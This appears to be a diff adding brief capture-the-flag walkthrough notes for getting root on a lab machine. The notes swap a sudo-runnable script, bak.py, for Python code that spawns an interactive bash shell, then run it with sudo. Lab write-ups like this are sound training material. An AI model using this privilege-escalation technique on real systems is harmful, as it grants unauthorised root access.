@@ -1,0 +1,9 @@
+To get into root first try [sudo -l]
+then check the output of the file and remove the file bak.py and create another new bak.py with the following python content
+[import os
+os.system("/bin/bash -i")]
+
+then save and run this command inside square brackets [sudo /usr/bin/python /home/meliodas/bak.py]
+then you will be a root.
+
+
